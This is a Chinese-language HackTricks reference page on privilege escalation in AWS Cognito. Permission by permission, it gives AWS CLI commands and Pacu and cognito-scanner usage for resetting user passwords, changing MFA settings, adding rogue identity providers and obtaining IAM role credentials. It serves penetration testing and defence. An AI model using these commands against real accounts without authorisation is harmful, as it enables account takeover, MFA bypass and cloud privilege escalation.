# AWS - Cognito 权限提升

<details>

<summary><strong>从零开始学习AWS黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在 **HackTricks中看到您的公司广告** 或 **下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## Cognito

更多关于Cognito的信息，请查看：

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### 工具

* [Pacu](https://github.com/RhinoSecurityLabs/pacu)，AWS利用框架，现在包括 "cognito\_\_enum" 和 "cognito\_\_attack" 模块，这些模块自动枚举账户中的所有Cognito资产并标记弱配置、用于访问控制的用户属性等，并自动化用户创建（包括MFA支持）和基于可修改的自定义属性、可用的身份池凭证、可假设的角色在id令牌中的权限提升等。

有关模块功能的描述，请参阅[博客文章](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2)的第2部分。有关安装说明，请参阅主要的[Pacu](https://github.com/RhinoSecurityLabs/pacu)页面。

#### 使用

示例cognito\_\_attack使用，尝试针对给定的身份池和用户池客户端创建用户和所有权限提升向量：
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
```markdown
Sample cognito__enum 用法，用于收集当前 AWS 账户中可见的所有用户池、用户池客户端、身份池、用户等信息：
```
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) 是一个用 Python 编写的 CLI 工具，它实现了对 Cognito 的不同攻击，包括权限提升攻击。

#### 安装
```bash
$ pip install cognito-scanner
```
#### 使用方法
```bash
$ cognito-scanner --help
```
### 从身份池收集凭证

由于 Cognito 可以向**经过认证**的和**未经认证**的**用户**授予 **IAM 角色凭证**，如果你找到了应用程序的**身份池 ID**（应该在应用程序中硬编码），你可以获取新的凭证，因此在 AWS 账户中提升权限（在这个账户中你可能之前甚至没有任何凭证）。

欲了解更多信息[**查看此页面**](../aws-unauthenticated-enum-access/#cognito)。

**潜在影响：** 直接提升权限到未认证用户（以及可能认证用户）所附加服务角色。

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

拥有这个权限，你可以**授予任何 Cognito 角色**给 Cognito 应用的经过认证/未经认证的用户。
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374" ole
```
如果 cognito 应用**未启用未经身份验证的用户**，您可能还需要权限 `cognito-identity:UpdateIdentityPool` 来启用它。

**潜在影响：** 直接 privesc 到任何 cognito 角色。

### `cognito-identity:update-identity-pool`

拥有此权限的攻击者可以设置例如一个他控制的 Cognito 用户池或任何其他身份提供者，他可以作为**访问此 Cognito 身份池的方式**登录。然后，仅在该用户提供者上**登录**将**允许他访问身份池中配置的经过身份验证的角色**。
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
它也可以**滥用此权限以允许基本认证**：
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**潜在影响**：危及身份池内配置的认证 IAM 角色。

### `cognito-idp:AdminAddUserToGroup`

此权限允许**将 Cognito 用户添加到 Cognito 组**，因此攻击者可以滥用此权限，将其控制下的用户添加到具有**更高**权限或**不同 IAM 角色**的其他组：
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**潜在影响：** 提升至其他 Cognito 组和附加到用户池组的 IAM 角色的权限。

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

拥有这些权限的攻击者可以**创建/更新组**，并将**每个可以被泄露的 Cognito 身份提供者使用的 IAM 角色**，使泄露的用户成为组的一部分，访问所有这些角色：

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**潜在影响：** 提升至其他 Cognito IAM 角色权限。

### `cognito-idp:AdminConfirmSignUp`

此权限允许**验证注册**。默认情况下，任何人都可以注册 Cognito 应用程序，如果保留默认设置，用户可以使用任何数据创建账户，并使用此权限进行验证。
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**潜在影响：** 如果您可以注册新用户，则对经过身份验证的用户的身份池IAM角色进行间接权限提升。如果能够确认任何账户，则对其他应用功能进行间接权限提升。

### `cognito-idp:AdminCreateUser`

此权限将允许攻击者在用户池内创建新用户。新用户被创建为启用状态，但需要更改其密码。
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**潜在影响：** 对于经过身份验证的用户，直接提升到身份池IAM角色的权限。间接提升到其他应用功能的权限，能够创建任何用户

### `cognito-idp:AdminEnableUser`

此权限可以在一个非常边缘的情况下帮助攻击者，即攻击者找到了一个被禁用用户的凭证，并且他需要**再次启用它**。
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**潜在影响：** 对于已认证用户，间接提升权限至身份池IAM角色，以及如果攻击者拥有被禁用用户的凭证，则获取该用户的权限。

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

此权限允许使用[**方法 ADMIN\_USER\_PASSWORD\_AUTH**](../aws-services/aws-cognito-enum/cognito-user-pools.md#admin\_no\_srp\_auth-and-admin\_user\_password\_auth)**。** 更多信息请点击链接。

### `cognito-idp:AdminSetUserPassword`

此权限将允许攻击者**更改任何用户的密码**，使其能够冒充任何用户（未启用MFA的用户）。
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**潜在影响：** 直接提升权限至可能是任何用户，因此可以访问每个用户所属的所有组，以及访问身份池认证的IAM角色。

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**：攻击者可能会滥用此权限，将其控制下的手机设置为**用户的SMS MFA**。
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference:** 类似于前一个权限，此权限可用于设置用户的MFA偏好，以绕过MFA保护。
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**：类似于前一个权限，此权限可用于设置用户池的MFA偏好设置，以绕过MFA保护。
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool：** 还可以更新用户池以更改MFA策略。[查看cli这里](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html)。

**潜在影响：** 间接的权限提升，可能影响攻击者知道凭证的任何用户，这可能允许绕过MFA保护。

### `cognito-idp:AdminUpdateUserAttributes`

拥有此权限的攻击者可以更改其控制下的用户的电子邮件、电话号码或任何其他属性，以尝试在底层应用程序中获得更多权限。\
这允许更改电子邮件或电话号码，并将其设置为已验证。
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**潜在影响：** 使用 Cognito 用户池的底层应用程序可能间接提升权限，这些权限基于用户属性。

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

拥有此权限的攻击者可以**创建一个限制较少的新用户池客户端**，相比已存在的池客户端更为宽松。例如，新客户端可能允许任何认证方法，不需要任何密钥，禁用了令牌吊销，允许令牌有效期更长...

如果不是创建新客户端，而是**修改现有客户端**，也可以做到同样的事情。

在[**命令行**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html)（或[**更新命令**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)）中，你可以看到所有选项，请检查！
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**潜在影响：**通过创建一个新的客户端来放宽安全措施，使攻击者有可能以他能够创建的用户身份登录，从而可能间接地提升到使用用户池的身份池授权用户的权限。

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

攻击者可以滥用此权限，通过上传包含新用户的 csv 文件来创建用户。
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
**潜在影响：** 对于经过身份验证的用户，直接提升至身份池IAM角色的权限。间接提升至其他应用功能的权限，能够创建任何用户。

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

攻击者可以创建一个新的身份提供商，然后能够**通过此提供商登录**。
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**潜在影响：** 直接提升权限至身份池IAM角色给认证用户。间接提升权限至其他应用功能，能够创建任何用户。

### cognito-sync:\* 分析

这是Cognito身份池角色默认非常常见的权限。即使在权限中使用通配符总是看起来不好（特别是来自AWS的），**授予的权限从攻击者的角度来看并不特别有用**。

此权限允许读取身份池和身份池内的身份ID的用户信息（这不是敏感信息）。\
身份ID可能有分配给它们的[**数据集**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API\_Dataset.html)，这是会话的信息（AWS将其定义为**保存的游戏**）。可能包含某种敏感信息（但可能性很低）。你可以在[**枚举页面**](../aws-services/aws-cognito-enum/)找到如何访问这些信息。

攻击者也可以使用这些权限**注册自己到一个发布这些数据集更改的Cognito流**或者**触发Cognito事件的lambda**。我没见过这种用法，我也不期望这里有敏感信息，但这并非不可能。

<details>

<summary><strong>从零到英雄学习AWS黑客攻击，请查看</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>

其他支持HackTricks的方式：

* 如果你想在**HackTricks中看到你的公司广告**或者**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享你的黑客技巧。**

</details>
